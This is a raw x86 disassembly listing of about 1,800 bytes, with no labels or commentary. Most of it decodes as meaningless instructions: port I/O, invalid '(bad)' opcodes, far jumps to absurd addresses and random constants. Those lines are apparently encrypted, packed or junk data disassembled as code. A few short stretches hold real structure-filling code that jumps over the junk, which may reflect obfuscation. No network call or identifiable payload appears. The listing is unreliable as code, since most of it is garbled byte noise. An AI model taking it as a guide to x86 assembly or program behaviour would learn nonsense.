  4030b5:	imul   ebp,esp,0x7d
  4030b8:	sub    eax,0x879d6cfa
  4030bd:	data16 jl 0x403102
  4030c0:	mov    dl,0xab
  4030c2:	add    DWORD PTR [eax-0x119cacc8],ecx
  4030c8:	push   esi
  4030c9:	mov    al,0x92
  4030cb:	mov    bh,ah
  4030cd:	das    
  4030ce:	sti    
  4030cf:	xchg   BYTE PTR [edx],bh
  4030d1:	pushf  
  4030d2:	ja     0x40312d
  4030d4:	aam    0xf4
  4030d6:	sahf   
  4030d7:	jp     0x40312d
  4030d9:	dec    ecx
  4030da:	pop    esp
  4030db:	sub    BYTE PTR ds:0xa96acfe3,bh
  4030e1:	test   BYTE PTR ds:0x3d9eeb0a,dh
  4030e7:	fwait
  4030e8:	sar    BYTE PTR [eax+0x631e8b0b],1
  4030ee:	lods   eax,DWORD PTR ds:[esi]
  4030ef:	jmp    0xdebd:0xf97b14d
  4030f6:	mov    dl,dh
  4030f8:	xchg   esp,eax
  4030f9:	xlat   BYTE PTR ds:[ebx]
  4030fa:	scas   eax,DWORD PTR es:[edi]
  4030fb:	scas   al,BYTE PTR es:[edi]
  4030fc:	xchg   ebx,eax
  4030fd:	std    
  4030fe:	add    ebp,DWORD PTR [ebp-0x1982734e]
  403104:	mov    ch,0xdc
  403106:	sub    al,dh
  403108:	ret    0x772d
  40310b:	sub    DWORD PTR [ecx-0x18e21d55],eax
  403111:	adc    ecx,DWORD PTR [esi+0x461fd6fc]
  403117:	pop    es
  403118:	jecxz  0x40311f
  40311a:	xchg   ebp,eax
  40311b:	imul   eax,DWORD PTR [eax],0xffffffaf
  40311e:	adc    al,0x9f
  403120:	mov    esi,0xb3ba2b80
  403125:	mov    ds:0x65ff6552,eax
  40312a:	add    BYTE PTR [ecx-0x72036fab],0x33
  403131:	sub    BYTE PTR [ebx+0xe],al
  403134:	mov    DWORD PTR [ebp-0x62],esp
  403137:	push   ecx
  403138:	fdiv   st(2),st
  40313a:	loop   0x4030c5
  40313c:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  403142:	clc    
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x11
  40316d:	out    0x94,al
  40316f:	and    ecx,DWORD PTR [ecx+0x6f7e7e15]
  403175:	jge    0x4031f5
  403177:	jle    0x403140
  403179:	push   esi
  40317a:	cli    
  40317b:	out    0x7c,al
  40317d:	sbb    DWORD PTR [ecx+0x1d],0xc407b37a
  403184:	pop    ecx
  403185:	popf   
  403186:	jnp    0x4031e9
  403188:	dec    esi
  403189:	sub    dl,0x4b
  40318c:	popa   
  40318d:	xor    DWORD PTR ds:0x80ceec5,edi
  403193:	jnp    0x40315f
  403195:	mov    ecx,0xe861df1a
  40319a:	inc    edx
  40319b:	or     edx,DWORD PTR [eax]
  40319d:	xor    eax,DWORD PTR [ecx+0x46]
  4031a0:	jbe    0x4031b6
  4031a2:	call   0x468f38fd
  4031a7:	sub    bh,ch
  4031a9:	lds    esp,FWORD PTR [ebp-0x3fb864a8]
  4031af:	mov    dl,0x75
  4031b1:	sbb    dh,dl
  4031b3:	cwde   
  4031b4:	mov    ah,0x17
  4031b6:	pop    edx
  4031b7:	out    0xa1,al
  4031b9:	fldcw  WORD PTR fs:[esi+0x4ddc71cf]
  4031c0:	out    dx,al
  4031c1:	mov    ebx,0xf2eee35e
  4031c6:	mov    DWORD PTR [edi-0x13e1f57a],ebx
  4031cc:	cmp    BYTE PTR [ebp+0x7e0e1ee8],dh
  4031d2:	sub    eax,0xf19cc80d
  4031d7:	jmp    0x1fa6f085
  4031dc:	imul   edx,DWORD PTR [ebx+ebp*8+0x19dff2f],0x48
  4031e4:	pop    esp
  4031e5:	pop    es
  4031e6:	inc    esp
  4031e7:	lods   al,BYTE PTR ss:[esi]
  4031e9:	add    ah,bh
  4031eb:	push   cs
  4031ec:	in     eax,0x17
  4031ee:	jl     0x4031ba
  4031f0:	addr16 out dx,al
  4031f2:	and    DWORD PTR [ebp+eiz*4+0x13fed782],eax
  4031f9:	icebp  
  4031fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031fb:	push   ecx
  4031fc:	mov    ds:0x77f0cc1f,al
  403201:	or     al,0x71
  403203:	or     cl,BYTE PTR fs:[edx-0x23]
  403207:	stos   DWORD PTR es:[edi],eax
  403208:	(bad)  
  403209:	shr    DWORD PTR [esi+ecx*1+0x2f5bf19f],cl
  403210:	dec    esp
  403211:	pop    ss
  403212:	add    DWORD PTR [esi],edx
  403214:	test   DWORD PTR [ebx-0x444b884f],esi
  40321a:	mov    bh,0x68
  40321c:	inc    esp
  40321d:	scas   eax,DWORD PTR es:[edi]
  40321e:	dec    esi
  40321f:	leave  
  403220:	xor    eax,0x511a5c62
  403225:	ds pop esp
  403227:	xlat   BYTE PTR ds:[ebx]
  403228:	cmp    DWORD PTR [ecx+0x36ee2cc3],ebx
  40322e:	jb     0x403270
  403230:	popa   
  403231:	xchg   esp,eax
  403232:	inc    ecx
  403233:	das    
  403234:	pop    esi
  403235:	cwde   
  403236:	ret    0xdd1a
  403239:	out    dx,eax
  40323a:	cld    
  40323b:	stos   DWORD PTR es:[edi],eax
  40323c:	pop    ebx
  40323d:	in     al,0xfa
  40323f:	ret    0x914
  403242:	jne    0x403284
  403244:	fwait
  403245:	or     ecx,DWORD PTR [ebp-0x3ff1c8d9]
  40324b:	fnstsw WORD PTR [ebp+0x3d]
  40324e:	add    esi,DWORD PTR [ecx+0x12d878e4]
  403254:	cmc    
  403255:	enter  0xa583,0x67
  403259:	pop    ss
  40325a:	fnstenv [esp+ecx*4-0x1f706c67]
  403261:	loope  0x403260
  403263:	cld    
  403264:	fisubr WORD PTR [ebx]
  403266:	out    0xf7,eax
  403268:	push   ss
  403269:	and    BYTE PTR [ecx-0x44b725d9],cl
  40326f:	call   0x4d4d71f5
  403274:	xor    dh,BYTE PTR [ebx-0x7214312b]
  40327a:	lods   eax,DWORD PTR ds:[esi]
  40327b:	sub    edx,esi
  40327d:	or     edi,ebp
  40327f:	mov    eax,ds:0x547a552c
  403284:	enter  0xa361,0x86
  403288:	mov    bl,0x7c
  40328a:	add    edx,DWORD PTR [eax+0x1d]
  40328d:	out    0xe3,al
  40328f:	lods   eax,DWORD PTR ds:[esi]
  403290:	iret   
  403291:	hlt    
  403292:	mov    edi,0x1b5747d5
  403297:	pop    ss
  403298:	adc    BYTE PTR ds:0x67cb4c25,bh
  40329e:	and    eax,0xb8f8c6db
  4032a3:	not    BYTE PTR [ebx-0x3c]
  4032a6:	fmul   DWORD PTR [eax+0x9]
  4032a9:	lahf   
  4032aa:	and    edi,DWORD PTR [edx-0x7e]
  4032ad:	pop    esi
  4032ae:	test   ch,bl
  4032b0:	repnz sbb bh,cl
  4032b3:	lods   eax,DWORD PTR ds:[esi]
  4032b4:	fmul   QWORD PTR [eax]
  4032b6:	jbe    0x40330c
  4032b8:	add    BYTE PTR [eax-0x20e733b5],ah
  4032be:	out    dx,al
  4032bf:	rcl    DWORD PTR [ecx],1
  4032c1:	xchg   esi,eax
  4032c2:	out    0xbd,eax
  4032c4:	pop    edx
  4032c5:	es jg  0x40329c
  4032c8:	mov    esi,0x40b6d71c
  4032cd:	lock (bad) 
  4032cf:	xlat   BYTE PTR ds:[ebx]
  4032d0:	and    DWORD PTR [edx-0x3a],0xfffffffc
  4032d4:	cmp    eax,0xf769d950
  4032d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032da:	out    dx,eax
  4032db:	ss int 0xf1
  4032de:	add    DWORD PTR [edx-0xe],ebp
  4032e1:	push   edi
  4032e2:	std    
  4032e3:	inc    ebx
  4032e4:	ret    
  4032e5:	adc    DWORD PTR [edi],ebp
  4032e7:	ins    BYTE PTR es:[edi],dx
  4032e8:	or     DWORD PTR [eax],edx
  4032ea:	and    ebx,DWORD PTR [ebx]
  4032ec:	jo     0x40329f
  4032ee:	enter  0x7cb2,0x35
  4032f2:	or     ch,ch
  4032f4:	mov    bl,BYTE PTR [ecx-0x21]
  4032f7:	sub    DWORD PTR [esi-0x7236ffc4],eax
  4032fd:	pop    ecx
  4032fe:	out    dx,eax
  4032ff:	dec    ebp
  403300:	outs   dx,DWORD PTR ds:[esi]
  403301:	dec    ecx
  403302:	push   ebp
  403303:	rep lods eax,DWORD PTR ds:[esi]
  403305:	xchg   esi,eax
  403306:	xor    BYTE PTR [eax+0x40d306c3],cl
  40330c:	test   BYTE PTR [esi-0x5776ff77],cl
  403312:	xchg   ebx,eax
  403313:	sbb    dl,BYTE PTR ds:0x14ed947a
  403319:	mov    al,ds:0x483dd56f
  40331e:	(bad)  
  40331f:	push   ecx
  403320:	mov    edx,0xedb96d25
  403325:	sbb    DWORD PTR [edi],ecx
  403327:	ins    BYTE PTR es:[edi],dx
  403328:	push   ebp
  403329:	rcr    DWORD PTR [ecx-0x28],1
  40332c:	sbb    al,0xff
  40332e:	jp     0x403382
  403330:	mov    al,0xbf
  403332:	mov    ecx,0xf664afc4
  403337:	xor    dl,dl
  403339:	xchg   ebx,eax
  40333a:	or     eax,0xa4f67466
  40333f:	dec    edx
  403340:	ret    
  403341:	add    edx,DWORD PTR [esi]
  403343:	jae    0x4033a6
  403345:	jno    0x4032d2
  403347:	sbb    bl,BYTE PTR [ebp+0x76]
  40334a:	repz push ebp
  40334c:	mov    ds:0xae637425,al
  403351:	pop    edi
  403352:	or     eax,0xe0968966
  403357:	shl    BYTE PTR [esp+eax*1-0x4471e05d],cl
  40335e:	dec    ebp
  40335f:	jmp    0x403376
  403361:	mov    DWORD PTR [edi+0x32],edi
  403364:	mov    ds:0x60144a7c,eax
  40336a:	sub    eax,0x1afc324
  40336f:	sub    eax,0xeeb8e2e2
  403374:	jne    0x4033c9
  403376:	iret   
  403377:	add    BYTE PTR ds:0xefe17039,dh
  40337d:	cmc    
  40337e:	mov    ch,0x34
  403380:	(bad)  
  403381:	xchg   ecx,eax
  403382:	inc    eax
  403383:	rcl    BYTE PTR [edi+0x72],0x5a
  403387:	mov    BYTE PTR [edx+ecx*1+0x14637e3f],ch
  40338e:	fst    QWORD PTR [edi+0x71bd8fd6]
  403394:	mov    ebp,0x39c39978
  403399:	test   BYTE PTR [ecx-0x5e027fc8],dh
  40339f:	push   ss
  4033a0:	stc    
  4033a1:	and    cl,dl
  4033a3:	pop    edi
  4033a4:	(bad)  
  4033a5:	in     eax,0x82
  4033a7:	popa   
  4033a8:	mov    ah,0x57
  4033aa:	mov    ah,0x71
  4033ac:	(bad)  
  4033ae:	mov    dl,BYTE PTR [esi]
  4033b0:	jb     0x403354
  4033b2:	jno    0x2d31d771
  4033b8:	mov    cl,0x4d
  4033ba:	sub    bl,BYTE PTR ds:0x8f854319
  4033c0:	jno    0x4033a8
  4033c2:	shr    BYTE PTR [edi],0x11
  4033c5:	jle    0x40337b
  4033c7:	mov    esp,0x26f8b1d4
  4033cc:	jp     0x4033d6
  4033ce:	leave  
  4033cf:	or     ch,BYTE PTR [ecx-0x20]
  4033d2:	ds call 0xb13:0x95ac28e8
  4033da:	mov    al,ds:0x3ee3acb
  4033df:	fbld   TBYTE PTR [ebx+0x6f]
  4033e2:	das    
  4033e3:	aas    
  4033e4:	enter  0x59b7,0xa4
  4033e8:	adc    eax,0x1031a739
  4033ed:	iret   
  4033ee:	mov    cl,0x26
  4033f0:	pop    es
  4033f1:	sub    al,0xbf
  4033f3:	xor    eax,0xff0007a4
  4033f8:	mov    bl,0x54
  4033fa:	cdq    
  4033fb:	pop    eax
  4033fc:	push   eax
  4033fd:	das    
  4033fe:	pop    ecx
  4033ff:	lods   eax,DWORD PTR ds:[esi]
  403400:	pop    ebx
  403401:	and    al,BYTE PTR [ebx-0x3a2e72e9]
  403407:	add    al,0xf6
  403409:	popf   
  40340a:	das    
  40340b:	and    esi,DWORD PTR [eax+0x3380eb16]
  403411:	sub    al,0x25
  403413:	in     eax,0x37
  403415:	mov    cl,0xb6
  403417:	in     eax,dx
  403418:	pop    esi
  403419:	push   es
  40341a:	(bad)  
  40341b:	icebp  
  40341c:	cmp    DWORD PTR [esi+0x10f4a282],esp
  403422:	leave  
  403423:	out    dx,eax
  403424:	sbb    DWORD PTR [edx+0x44],0x62
  403428:	jmp    0xeddc9d0
  40342d:	push   edx
  40342e:	mov    ebp,0x92d2c7ff
  403433:	add    DWORD PTR [si+0x6e],eax
  403437:	mov    cl,BYTE PTR [eax-0x5a0733cc]
  40343d:	sub    DWORD PTR [ebx+edi*2+0x2],0x5b
  403442:	xchg   ebx,eax
  403443:	or     al,0x78
  403445:	cmc    
  403446:	xchg   edi,eax
  403447:	pop    edx
  403448:	push   esp
  403449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40344a:	cs mov edi,0x4de25507
  403450:	retf   0x73ee
  403453:	lea    esi,[ebp+0x51]
  403456:	aaa    
  403457:	inc    ebp
  403458:	inc    ecx
  403459:	div    DWORD PTR [edi-0x2263dc46]
  40345f:	int    0x61
  403461:	dec    edi
  403462:	sbb    ebp,esp
  403464:	sub    eax,0x114d94a7
  403469:	push   ds
  40346a:	pop    edx
  40346b:	cmp    edx,DWORD PTR [ebx]
  40346d:	adc    ah,dl
  40346f:	int    0x5
  403471:	mov    ebx,0xcf980d7b
  403476:	xor    eax,0x79942a09
  40347b:	(bad)  
  40347c:	pop    ss
  40347d:	repz into 
  40347f:	sbb    BYTE PTR [edx+0x2d8bf228],dl
  403485:	js     0x4034fd
  403487:	aad    0x1b
  403489:	je     0x403449
  40348b:	stc    
  40348c:	inc    edi
  40348d:	inc    edi
  40348e:	in     al,dx
  40348f:	rcl    DWORD PTR [eax+ebp*1],cl
  403492:	xor    edx,DWORD PTR [ebx]
  403494:	sub    dl,dh
  403496:	xor    ebp,DWORD PTR [ebx]
  403498:	imul   BYTE PTR [edx+0xd38914a]
  40349e:	mov    ebp,0x98603bdc
  4034a3:	xchg   edi,eax
  4034a4:	test   BYTE PTR ds:0xc85616de,cl
  4034aa:	repz mov edi,0x969325d8
  4034b0:	jecxz  0x403496
  4034b2:	mov    ch,0x91
  4034b4:	push   0x50a7c81e
  4034b9:	mov    al,0x49
  4034bb:	sub    eax,0xc77a4095
  4034c0:	and    al,0x7a
  4034c2:	aas    
  4034c3:	(bad)  
  4034c4:	jg     0x4034f8
  4034c6:	repz test BYTE PTR [esi],0x9a
  4034ca:	ret    
  4034cb:	shl    esi,1
  4034cd:	outs   dx,BYTE PTR ds:[esi]
  4034ce:	mov    ch,BYTE PTR [edx]
  4034d0:	(bad)  
  4034d1:	retf   0x4e63
  4034d4:	jg     0x40351f
  4034d6:	cs stos DWORD PTR es:[edi],eax
  4034d8:	jl     0x403464
  4034da:	shr    BYTE PTR [ebx],0x68
  4034dd:	(bad)  
  4034de:	lods   al,BYTE PTR ds:[esi]
  4034df:	lds    ecx,FWORD PTR [ebx-0x73]
  4034e2:	xchg   ecx,eax
  4034e3:	fld    st(3)
  4034e5:	jg     0x403485
  4034e7:	dec    ebp
  4034e8:	inc    eax
  4034e9:	add    BYTE PTR [edi],bl
  4034eb:	mov    al,0x55
  4034ed:	loope  0x40351c
  4034ef:	cdq    
  4034f0:	mov    edx,0x58fea937
  4034f5:	es lods al,BYTE PTR fs:[esi]
  4034f8:	sar    BYTE PTR [esi-0x7762662c],1
  4034fe:	dec    ebx
  4034ff:	dec    edi
  403500:	adc    ebp,0x5acf91e2
  403506:	stos   BYTE PTR es:[edi],al
  403507:	fldcw  WORD PTR [ebp-0x29146f47]
  40350d:	add    al,0xe0
  40350f:	retf   0xacff
  403512:	lea    edx,[ecx]
  403514:	mov    bl,0x2a
  403516:	sar    BYTE PTR [eax],1
  403518:	cmp    al,0xd9
  40351a:	into   
  40351b:	xor    eax,0x31eaab0c
  403520:	pop    ebp
  403521:	(bad)  
  403522:	pushf  
  403523:	adc    dl,bl
  403525:	loop   0x40350a
  403527:	les    ebp,FWORD PTR [eax]
  403529:	adc    DWORD PTR [ecx-0x72b113d9],edi
  40352f:	push   0x20483c08
  403534:	lock add BYTE PTR [ebp+0x7d],dh
  403538:	imul   esp,DWORD PTR [esi+ebp*4+0x32ede123],0x18
  403540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403541:	(bad)  
  403542:	int    0xb5
  403544:	push   edx
  403545:	push   ebx
  403546:	sbb    BYTE PTR [edx+0x75eeb90],al
  40354c:	push   edi
  40354d:	jnp    0x403555
  40354f:	lahf   
  403550:	int    0xd8
  403552:	sti    
  403553:	icebp  
  403554:	(bad)  [esi-0x28]
  403557:	sub    bl,BYTE PTR [esp+ecx*8+0x3c1df50c]
  40355e:	ret    0xd344
  403561:	sbb    al,0xe6
  403563:	out    0xab,eax
  403565:	repz ficomp DWORD PTR [edi]
  403568:	dec    ebx
  403569:	mov    ecx,DWORD PTR [ebp-0x8]
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	jge    0x4035f2
  403599:	pop    ds
  40359a:	dec    ebx
  40359b:	xchg   BYTE PTR [ecx],dl
  40359d:	jle    0x40361d
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x403580
  4035a4:	scas   eax,DWORD PTR es:[edi]
  4035a5:	jmp    0x4b23fd50
  4035aa:	dec    ebx
  4035ab:	and    ch,BYTE PTR [edi]
  4035ad:	jbe    0x4035e7
  4035af:	mov    eax,ds:0x141b88cd
  4035b4:	sbb    al,BYTE PTR [edi-0x7e]
  4035b7:	jmp    0x4035d0
  4035b9:	das    
  4035ba:	ins    DWORD PTR es:[edi],dx
  4035bb:	stc    
  4035bc:	ror    BYTE PTR [ebx+0x12],cl
  4035bf:	fistp  QWORD PTR [esi+0x2963148a]
  4035c5:	pop    esp
  4035c6:	iret   
  4035c7:	push   0x47175f05
  4035cc:	js     0x4035f3
  4035ce:	push   es
  4035cf:	xchg   ecx,eax
  4035d0:	(bad)  [eax+0x549b2a26]
  4035d6:	push   eax
  4035d7:	mov    ecx,0x5667338f
  4035dc:	or     al,0x69
  4035de:	dec    edx
  4035df:	mov    ebx,0x7d0aba15
  4035e4:	cmp    dh,BYTE PTR [eax+edx*1]
  4035e7:	jp     0x403644
  4035e9:	dec    edx
  4035ea:	test   eax,0xf64f43a1
  4035ef:	or     eax,0xb0e530a0
  4035f4:	dec    edx
  4035f5:	outs   dx,BYTE PTR ds:[esi]
  4035f6:	mov    ds:0x24a811ee,al
  4035fb:	sbb    ebx,esp
  4035fd:	jbe    0x4035ff
  4035ff:	jnp    0x40362d
  403601:	dec    esi
  403602:	inc    ecx
  403603:	adc    esi,DWORD PTR [ebp+0x5f]
  403606:	scas   eax,DWORD PTR es:[edi]
  403607:	rcr    BYTE PTR [ecx-0x6],1
  40360a:	adc    eax,0x165f9584
  40360f:	(bad)  
  403610:	adc    DWORD PTR [edx],esp
  403612:	xlat   BYTE PTR ds:[ebx]
  403613:	inc    esi
  403614:	adc    eax,0x90f12b04
  403619:	and    DWORD PTR [edi-0x5a9900d7],edi
  40361f:	data16 jae 0x4035b4
  403622:	mov    ebx,DWORD PTR [eax]
  403624:	sbb    DWORD PTR [ebp+0x20],esi
  403627:	push   edx
  403628:	(bad)  
  403629:	sbb    dh,cl
  40362b:	and    al,0x5b
  40362d:	add    dh,BYTE PTR [eax-0x4]
  403630:	imul   esp,DWORD PTR [ebp+eiz*2-0x211cc840],0xbe19ed9a
  40363b:	sahf   
  40363c:	(bad)  
  40363e:	push   0xffffffdd
  403640:	mov    al,0x50
  403642:	cli    
  403643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403644:	je     0x4036c4
  403646:	outs   dx,DWORD PTR ds:[esi]
  403647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403648:	dec    esp
  403649:	fld    TBYTE PTR [edx]
  40364b:	into   
  40364c:	sbb    ch,BYTE PTR [edx+0x1a]
  40364f:	pusha  
  403650:	inc    ebp
  403651:	jl     0x403689
  403653:	leave  
  403654:	fcom   DWORD PTR [ebp-0x290fae0f]
  40365a:	sub    al,0x48
  40365c:	sub    dh,bh
  40365e:	call   0x57ae1d1d
  403663:	push   DWORD PTR [eax-0x40]
  403666:	ret    0x3ef
  403669:	xchg   edx,eax
  40366a:	out    0x6,eax
  40366c:	sub    al,0xca
  40366e:	xchg   ebp,eax
  40366f:	and    al,0x52
  403671:	mov    WORD PTR [ebx-0x78],ss
  403674:	std    
  403675:	(bad)  
  403676:	(bad)  
  403677:	lods   al,BYTE PTR ds:[esi]
  403678:	push   0xb9226cc4
  40367d:	jo     0x40369f
  40367f:	fwait
  403680:	adc    eax,0x7b0e0ce9
  403685:	lods   al,BYTE PTR ds:[esi]
  403686:	mov    ah,0x2d
  403688:	aaa    
  403689:	jg     0x403655
  40368b:	jmp    0x403627
  40368d:	std    
  40368e:	cli    
  40368f:	and    BYTE PTR [ebx+0x1e],dh
  403692:	adc    BYTE PTR [edx],cl
  403694:	add    BYTE PTR [eax-0x55],bh
  403697:	jl     0x4036f5
  403699:	mov    edi,0xd0e065e0
  40369e:	mov    ebp,0xdd374efe
  4036a3:	shl    BYTE PTR [eax+0x7b],0x5e
  4036a7:	pop    ecx
  4036a8:	fcom   st(1)
  4036aa:	(bad)  
  4036ab:	mov    bl,0x27
  4036ad:	cmp    eax,0x2b849d6b
  4036b2:	push   eax
  4036b3:	aaa    
  4036b4:	into   
  4036b5:	pop    ss
  4036b6:	push   ebp
  4036b7:	pop    esi
  4036b8:	stos   DWORD PTR es:[edi],eax
  4036b9:	mov    bl,bl
  4036bb:	daa    
  4036bc:	into   
  4036bd:	in     eax,dx
  4036be:	mov    ds:0x417812df,al
  4036c3:	hlt    
  4036c4:	xchg   edi,eax
  4036c5:	mov    ds:0x89272ff3,al
  4036ca:	fs imul esi,ebp,0x31
  4036ce:	mov    al,ds:0xeb6a3a28
  4036d3:	mov    esp,0x39df0c02
  4036d8:	pop    ecx
  4036d9:	push   esp
  4036da:	gs xchg edi,eax
  4036dc:	sub    BYTE PTR [ebp+0x6f],cl
  4036df:	icebp  
  4036e0:	dec    esi
  4036e1:	xor    eax,0x40f4a81c
  4036e6:	js     0x403746
  4036e8:	xchg   DWORD PTR [edx+0x31],esi
  4036eb:	ror    BYTE PTR [edi+0x7c],cl
  4036ee:	add    esp,DWORD PTR [edx]
  4036f0:	(bad)  
  4036f2:	mov    dl,0x59
  4036f4:	cmp    cl,bl
  4036f6:	mov    eax,ds:0x17b4c86c
  4036fb:	(bad)  
  4036fc:	jns    0x403733
  4036fe:	imul   esi,DWORD PTR [edx],0x91917b20
  403704:	or     ecx,edx
  403706:	jp     0x40377a
  403708:	test   eax,0x46614886
  40370d:	or     al,0x4
  40370f:	js     0x403695
  403711:	push   esp
  403712:	ins    BYTE PTR es:[edi],dx
  403713:	(bad)
  403717:	jp     0x403768
  403719:	pop    ds
  40371a:	pusha  
  40371b:	sub    ah,BYTE PTR [esi]
  40371d:	xchg   edi,eax
  40371e:	loope  0x40379a
  403720:	push   ecx
  403721:	or     eax,0x55f9fdbf
  403726:	xchg   ebp,eax
  403727:	rcl    DWORD PTR ds:[edx+0x9],cl
  40372b:	cwde   
  40372c:	sbb    al,0x4e
  40372e:	f2xm1  
  403730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403731:	into   
  403732:	gs pop edi
  403734:	inc    ah
  403736:	test   al,0x17
  403738:	pop    esi
  403739:	cld    
  40373a:	push   esp
  40373b:	pushf  
  40373c:	mov    dh,0xa4
  40373e:	mov    BYTE PTR [eax-0x23],bh
  403741:	test   eax,0x2e7c5be8
  403746:	cmp    esp,DWORD PTR [esp+ecx*8-0x4853a9f7]
  40374d:	push   ds
  40374e:	mov    ecx,0x50dc716d
  403753:	push   eax
  403754:	and    dh,BYTE PTR [eax+0x6da9b751]
  40375a:	pop    eax
  40375b:	inc    eax
  40375c:	aam    0x55
  40375e:	sbb    BYTE PTR [edx-0x7ea2878e],ah
  403764:	js     0x4037b7
  403766:	push   ebp
  403767:	arpl   bp,si
  403769:	loopne 0x4036f7
  40376b:	fs lahf 
  40376d:	mov    fs,WORD PTR [ebp-0x59a8d95e]
  403773:	es jp  0x4037b9
  403776:	fs ds pop ds
  403779:	jg     0x403724
  40377b:	stc    
  40377c:	pop    ecx
  40377d:	sub    cl,bl
  40377f:	mov    edx,ebx
  403781:	call   0x358c:0xf2323918
  403788:	and    DWORD PTR [ebx],ecx
  40378a:	xchg   DWORD PTR [ecx+0x40],edx
  40378d:	scas   eax,DWORD PTR es:[edi]
  40378e:	fld    DWORD PTR [ebp+0x778fc300]
  403794:	mov    bl,0xb
  403796:	mov    eax,0x3bd9dfcc
  40379b:	jg     0x4037ef
  40379d:	aaa    
  40379e:	pop    esi
  40379f:	fild   QWORD PTR [edi+0xacecd15]
  4037a5:	les    eax,FWORD PTR [edi-0x7054b4e3]
  4037ab:	es in  al,0x4d
  4037ae:	cld    
  4037af:	pop    esp
  4037b0:	adc    edx,DWORD PTR [ebx]
  4037b2:	arpl   WORD PTR [eax-0x9],si
  4037b5:	pop    ebp
  4037b6:	lock cdq 
  4037b8:	fiadd  WORD PTR [edi+edx*8+0x1d687792]
  4037bf:	inc    ebx
  4037c0:	xor    esi,DWORD PTR [ecx+0x3d]
  4037c3:	mov    al,0x31
  4037c5:	sbb    al,ah
  4037c7:	or     BYTE PTR [ebp-0x4f07556],al
  4037cd:	xor    cl,BYTE PTR [eax+ecx*8+0x31759aed]
  4037d4:	mov    cl,0x9e
  4037d6:	outs   dx,BYTE PTR ds:[esi]
  4037d7:	cmp    ch,BYTE PTR [ebp+0x79]
  4037da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037db:	fwait
  4037dc:	mov    bl,0xd4
  4037de:	lock dec edi
  4037e0:	adc    ah,BYTE PTR [ebp-0x39]
  4037e3:	and    esp,esi
  4037e5:	cwde   
  4037e6:	idiv   BYTE PTR [ebx+0x119a4eb6]
  4037ec:	lods   eax,DWORD PTR ds:[esi]
  4037ed:	int3   
  4037ee:	and    BYTE PTR [esi-0xe467dce],0x82
  4037f5:	int    0x6c
  4037f7:	jecxz  0x403781
  4037f9:	add    DWORD PTR [ebx-0xd8e4651],ebx
  4037ff:	imul   ebx,DWORD PTR [ecx],0xe3e2b600
  403805:	push   ss
  403806:	lods   eax,DWORD PTR ds:[esi]
  403807:	enter  0x2f70,0x17
  40380b:	out    0x2a,eax
  40380d:	in     eax,dx
  40380e:	fidivr WORD PTR [edx+0x63]
  403811:	fwait
  403812:	outs   dx,DWORD PTR ds:[esi]
  403813:	xor    esp,DWORD PTR [eax]
  403815:	push   eax
  403816:	and    al,0x9b
  403818:	test   DWORD PTR [eax],ecx
  40381a:	cmp    BYTE PTR [ebx+0x3d],dh
  40381d:	dec    edx
  40381e:	(bad)  
  40381f:	(bad)  
  403820:	fs sar edi,0x3c
  403824:	fldenv [edi]
  403826:	loopne 0x40389b
  403828:	adc    ebp,DWORD PTR [esi-0x8]
  40382b:	in     eax,dx
  40382c:	lods   al,BYTE PTR ds:[esi]
  40382d:	mov    WORD PTR [edi],?
  40382f:	repnz sub BYTE PTR [eax],bh
  403832:	imul   esi,DWORD PTR [esi+0x63],0x3b
  403836:	mov    bh,0x71
  403838:	adc    ch,BYTE PTR [edi+0x1f79afb3]
  40383e:	mov    cl,BYTE PTR [esi-0x12b4deab]
  403844:	push   cs
  403845:	jecxz  0x403848
  403847:	jl     0x40388f
  403849:	enter  0xa7e0,0x7f
  40384d:	add    dl,cl
  40384f:	(bad)  
  403850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403851:	jmp    0x403815
  403853:	xchg   edx,eax
  403854:	(bad)  
  403855:	scas   al,BYTE PTR es:[edi]
  403856:	xor    eax,0xdea610e7
  40385b:	adc    al,0x81
  40385d:	inc    eax
  40385e:	inc    ecx
  40385f:	stos   BYTE PTR es:[edi],al
  403860:	mov    ebp,0x2a0829aa
  403865:	mov    ds:0x83b5e901,eax
  40386a:	adc    DWORD PTR [esi+0x60],esp
  40386d:	dec    esp
  40386e:	into   
  40386f:	xor    eax,0x7b39a7b2
  403874:	into   
  403875:	retf   0xb85a
  403878:	dec    edi
  403879:	inc    eax
  40387a:	fwait
  40387b:	xchg   esp,eax
  40387c:	mov    BYTE PTR [eax-0x49],ch
  40387f:	cdq    
  403880:	bound  esp,QWORD PTR [esi+0x27]
  403883:	add    eax,DWORD PTR [edi]
  403885:	xchg   esp,eax
  403886:	and    BYTE PTR [esi],bh
  403888:	inc    eax
  403889:	inc    ecx
  40388a:	adc    ah,BYTE PTR ss:0xc05dc1ff
